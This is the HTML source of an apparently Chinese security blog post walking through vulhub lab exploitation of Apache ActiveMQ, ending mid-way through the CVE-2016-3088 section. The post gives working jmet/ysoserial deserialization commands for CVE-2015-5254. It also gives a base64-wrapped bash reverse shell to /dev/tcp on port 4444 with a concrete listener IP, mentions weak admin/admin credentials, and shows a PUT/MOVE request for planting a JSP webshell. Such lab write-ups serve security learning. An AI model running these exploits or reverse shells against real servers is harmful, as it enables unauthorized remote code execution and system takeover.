@@ -1,0 +1,501 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"eryao7.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.8.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+<meta name="description" content="ActiveMQApache ActiveMQ是Apache软件基金会所研发的开放源代码消息中间件；由于ActiveMQ是一个纯Java程序，因此只需要操作系统支持Java虚拟机，ActiveMQ便可执行。、 参考文章 消息中间件ActiveMQ使用详解 - 追梦1819 - 博客园 ActiveMQ详解_一念成佛_LHY的博客-CSDN博客_activemq">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vulhub漏洞—ActiveMQ">
+<meta property="og:url" content="http://eryao7.github.io/2021/12/08/vulhub%E6%BC%8F%E6%B4%9E%E2%80%94ActiveMQ/index.html">
+<meta property="og:site_name" content="ErYao7">
+<meta property="og:description" content="ActiveMQApache ActiveMQ是Apache软件基金会所研发的开放源代码消息中间件；由于ActiveMQ是一个纯Java程序，因此只需要操作系统支持Java虚拟机，ActiveMQ便可执行。、 参考文章 消息中间件ActiveMQ使用详解 - 追梦1819 - 博客园 ActiveMQ详解_一念成佛_LHY的博客-CSDN博客_activemq">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/ErYao7/photo/master/202112081035644.png">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">
+<meta property="og:image" content="https://raw.githubusercontent.com/ErYao7/photo/master/202112081035018.png">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">
+<meta property="og:image" content="https://raw.githubusercontent.com/ErYao7/photo/master/202112081035769.png">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/cd94d807641142ef9ab696a1e3d2e703.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARXJZYW83,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/644242d56d7d4cc8a88f74392e8d0c6f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARXJZYW83,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">
+<meta property="og:image" content="https://raw.githubusercontent.com/ErYao7/photo/master/202112081035561.png">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">
+<meta property="og:image" content="https://raw.githubusercontent.com/ErYao7/photo/master/202112081035623.png">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">
+<meta property="og:image" content="https://raw.githubusercontent.com/ErYao7/photo/master/202112081035941.png">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">
+<meta property="og:image" content="https://raw.githubusercontent.com/ErYao7/photo/master/202112081035667.png">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">
+<meta property="og:image" content="https://raw.githubusercontent.com/ErYao7/photo/master/202112081035813.png">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/62178b3707014be2a0e9ff4a2ef6c73d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARXJZYW83,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">
+<meta property="og:image" content="https://raw.githubusercontent.com/ErYao7/photo/master/202112081035608.png">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">
+<meta property="og:image" content="https://raw.githubusercontent.com/ErYao7/photo/master/202112081035475.png">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">
+<meta property="og:image" content="https://raw.githubusercontent.com/ErYao7/photo/master/202112081035869.png">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">
+<meta property="og:image" content="https://raw.githubusercontent.com/ErYao7/photo/master/202112081035198.png">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">
+<meta property="og:image" content="https://raw.githubusercontent.com/ErYao7/photo/master/202112081035455.png">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">
+<meta property="og:image" content="https://raw.githubusercontent.com/ErYao7/photo/master/202112081035403.png">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">
+<meta property="og:image" content="https://raw.githubusercontent.com/ErYao7/photo/master/202112081035103.png">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/96025a5455034e8fbef650bf4dd0139b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARXJZYW83,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">
+<meta property="article:published_time" content="2021-12-08T02:33:18.000Z">
+<meta property="article:modified_time" content="2021-12-08T03:04:13.303Z">
+<meta property="article:author" content="ErYao7">
+<meta property="article:tag" content="vulhub漏洞">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/ErYao7/photo/master/202112081035644.png">
+
+
+<link rel="canonical" href="http://eryao7.github.io/2021/12/08/vulhub%E6%BC%8F%E6%B4%9E%E2%80%94ActiveMQ/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://eryao7.github.io/2021/12/08/vulhub%E6%BC%8F%E6%B4%9E%E2%80%94ActiveMQ/","path":"2021/12/08/vulhub漏洞—ActiveMQ/","title":"vulhub漏洞—ActiveMQ"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>vulhub漏洞—ActiveMQ | ErYao7</title>
+  
+
+  <script src="/js/third-party/analytics/baidu-analytics.js"></script>
+  <script async src="https://hm.baidu.com/hm.js?c92ad4f568c8e98b7c047d3479b8585b"></script>
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="ErYao7" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">ErYao7</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ActiveMQ"><span class="nav-text">ActiveMQ</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9A"><span class="nav-text">漏洞利用：</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ActiveMQ-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2015-5254%EF%BC%89"><span class="nav-text">ActiveMQ 反序列化漏洞（CVE-2015-5254）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B%E5%A6%82%E4%B8%8B%EF%BC%9A"><span class="nav-text">漏洞利用过程如下：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-text"></span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="nav-text">反弹shell</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ActiveMQ-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-3088%EF%BC%89"><span class="nav-text">ActiveMQ 任意文件上传漏洞（CVE-2016-3088）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%83%8C%E6%99%AF%E7%AE%80%E8%BF%B0"><span class="nav-text">背景简述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E8%AF%A6%E6%83%85"><span class="nav-text">漏洞详情</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#-1"><span class="nav-text"></span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EXP1"><span class="nav-text">EXP1:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EXP2%EF%BC%9A"><span class="nav-text">EXP2：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%99%E5%85%A5%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="nav-text">写入计划任务</span></a></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="ErYao7"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">ErYao7</p>
+  <div class="site-description" itemprop="description">欢迎来到ErYao7的博客~</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">23</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://eryao7.github.io/2021/12/08/vulhub%E6%BC%8F%E6%B4%9E%E2%80%94ActiveMQ/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="ErYao7">
+      <meta itemprop="description" content="欢迎来到ErYao7的博客~">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ErYao7">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          vulhub漏洞—ActiveMQ
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2021-12-08 10:33:18 / 修改时间：11:04:13" itemprop="dateCreated datePublished" datetime="2021-12-08T10:33:18+08:00">2021-12-08</time>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="ActiveMQ"><a href="#ActiveMQ" class="headerlink" title="ActiveMQ"></a><strong>ActiveMQ</strong></h1><p><strong>Apache ActiveMQ</strong>是<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/Apache%E8%BD%AF%E4%BB%B6%E5%9F%BA%E9%87%91%E4%BC%9A">Apache软件基金会</a>所研发的开放源代码<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%B6%88%E6%81%AF%E4%B8%AD%E9%97%B4%E4%BB%B6">消息中间件</a>；由于ActiveMQ是一个纯<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/Java">Java</a>程序，因此只需要<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F">操作系统</a>支持<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/Java%E8%99%9A%E6%8B%9F%E6%9C%BA">Java虚拟机</a>，ActiveMQ便可执行。、</p>
+<p>参考文章</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yanfei1819/p/10615605.html">消息中间件ActiveMQ使用详解 - 追梦1819 - 博客园</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36807862/article/details/81283951">ActiveMQ详解_一念成佛_LHY的博客-CSDN博客_activemq</a></p>
+<span id="more"></span>
+
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>Goby扫描资产</p>
+<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081035644.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p> 发现端口 8161和61616，我们访问一波</p>
+<p>8161是web管理页面端口</p>
+<p>61616端口则是工作端口，<strong>消息在这个端口进行传递</strong></p>
+<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081035018.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081035769.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<h1 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h1><h2 id="ActiveMQ-反序列化漏洞（CVE-2015-5254）"><a href="#ActiveMQ-反序列化漏洞（CVE-2015-5254）" class="headerlink" title="ActiveMQ 反序列化漏洞（CVE-2015-5254）"></a>ActiveMQ 反序列化漏洞（CVE-2015-5254）</h2><h3 id="漏洞利用过程如下："><a href="#漏洞利用过程如下：" class="headerlink" title="漏洞利用过程如下："></a><strong>漏洞利用过程如下：</strong></h3><ol>
+<li>生成序列化的有效负载（你可以使用 ysoserial）</li>
+<li>将有效负载发送到端口 61616</li>
+<li>访问web管理页面并读取序列化消息，然后您就可以触发漏洞。</li>
+</ol>
+<p>为了利用这个环境，我们将使用<a target="_blank" rel="noopener" href="https://github.com/matthiaskaiser/jmet">jmet</a>（Java 消息利用工具）。首先下载jmet的jar文件，在同一目录下创建<strong>external</strong>文件夹（否则可能会出现文件夹不存在的错误）。</p>
+<p>jmet是使用ysoserial生成Payload并发送（jar自带ysoserial，我们不需要重新下载），所以我们需要选择一个可以在ysoserial中使用的gadget，比如ROME .</p>
+<p>使用<a target="_blank" rel="noopener" href="https://github.com/matthiaskaiser/jmet/releases">jmet</a>进行漏洞利用。首先下载jmet的jar文件</p>
+<p>jmet原理是使用ysoserial生成Payload并发送（其jar内自带ysoserial，无需再自己下载），所以我们需要在ysoserial是gadget中选择一个可以使用的，比如ROME</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;touch /tmp/success&quot; -Yp ROME 靶机IP 61616</span><br></pre></td></tr></table></figure>
+
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p><img src="https://img-blog.csdnimg.cn/cd94d807641142ef9ab696a1e3d2e703.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARXJZYW83,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>此时，会给目标ActiveMQ添加一个名为event的队列，可以过 <code>http://IP:8161/admin/browse.jsp?JMSDestination=event</code> 看到这个队列的所有消息</p>
+<p>弱口令 admin admin 登录</p>
+<p><img src="https://img-blog.csdnimg.cn/644242d56d7d4cc8a88f74392e8d0c6f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARXJZYW83,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>点击此条消息，如果在靶机docker中的<code>/tmp</code>目录下中创建了<code>success</code>文件，则表明该漏洞可以利用</p>
+<h1 id><a href="#" class="headerlink" title></a></h1><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>bash 命令直弹</p>
+<p>反弹shell时要将命令base64加密后发送，利用bash在目标机解密执行，在不加密的情况下执行命令不能反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">进行base64编码</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/ip/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081035561.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jmet 命令</span><br><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;bash -c &#123;echo,base64编码结果替换此段文字&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -Yp ROME 101.35.15.184 61616</span><br></pre></td></tr></table></figure>
+
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081035623.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p> 命令执行成功后，在8161端口中找到我们提交的记录，当点击该条记录则直接反弹回shell</p>
+<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081035941.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">监听端口4444，反弹成功~</p>
+<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081035667.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<h2 id="ActiveMQ-任意文件上传漏洞（CVE-2016-3088）"><a href="#ActiveMQ-任意文件上传漏洞（CVE-2016-3088）" class="headerlink" title="ActiveMQ 任意文件上传漏洞（CVE-2016-3088）"></a>ActiveMQ 任意文件上传漏洞（CVE-2016-3088）</h2><h3 id="背景简述"><a href="#背景简述" class="headerlink" title="背景简述"></a><strong>背景简述</strong></h3><p>ActiveMQ的web控制台分三个应用，admin、api和fileserver，其中admin是管理员页面，api是接口，fileserver是储存文件的接口；admin和api都需要登录后才能使用，fileserver无需登录。</p>
+<p>fileserver是一个RESTful API接口，我们可以通过GET、PUT、DELETE等HTTP请求对其中存储的文件进行读写操作，其设计目的是为了弥补消息队列操作不能传输、存储二进制文件的缺陷，但后来发现：</p>
+<p>其使用率并不高<br> 文件操作容易出现漏洞<br> 所以，ActiveMQ在5.12.x~5.13.x版本中，已经默认关闭了fileserver这个应用（你可以在conf/jetty.xml中开启之）；在5.14.0版本以后，彻底删除了fileserver应用。</p>
+<p>在测试过程中，可以关注ActiveMQ的版本，避免走弯路。</p>
+<h3 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a><strong>漏洞详情</strong></h3><p>这个漏洞出现在Fileserver应用中，漏洞原理其实很简单，就是fileserver支持写文件（但不解析JSP），同时支持移动文件（MOVE请求）。所以，我们只需要写入一个文件，然后使用移动请求将其移动到任何位置，从而导致任意文件写入漏洞。</p>
+<p>写入cron或ssh key等文件</p>
+<ol>
+<li>编写Webshell</li>
+<li>写入cron或ssh key等文件</li>
+<li>编写jar或jetty.xml等库和配置文件</li>
+</ol>
+<p>写webshell的好处是方便，但是fileserver不解析jsp，admin和api都需要登录才能访问，有点白费力气；写cron或者ssh key的好处是直接反向Shell，也方便，坏处是需要root权限；写jar，有点麻烦（需要jar后门），写xml配置文件，这个方法比较靠谱，但是有一个徒劳的地方：我们需要知道ActiveMQ的绝对路径。</p>
+<h3 id="-1"><a href="#-1" class="headerlink" title></a></h3><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>首先我们使用的put方式上传了test.txt文件到fileserver目录下面，但是在该目录下面的文件是不能够被执行的，执行JSP脚本的目录是admin或者是api目录下面，这两个目录具有执行JSP文件的权限，但是这两个目录需要登陆才能够进入，所以可能会存在4XX的错误，这是没有权限的原因。</p>
+<p>骚姿势：fileserver目录可以支持写入文件，并且该目录也支持move文件到其他的目录下面，因此我们可以通过上传shell脚本文件到fileserver目录下面，然后将该目录下面的文件移动到解析jsp文件的目录下面，这样就可以造成任意文件写入的漏洞。</p>
+<p>上传文件 test.txt </p>
+<p> <img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081035813.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<blockquote>
+<p>修改数据包，123456 不要删除</p>
+<p>MOVE /fileserver/1.txt HTTP/1.1</p>
+<p>Destination:file:///opt/activemq/webapps/api/testhacker.jsp</p>
+</blockquote>
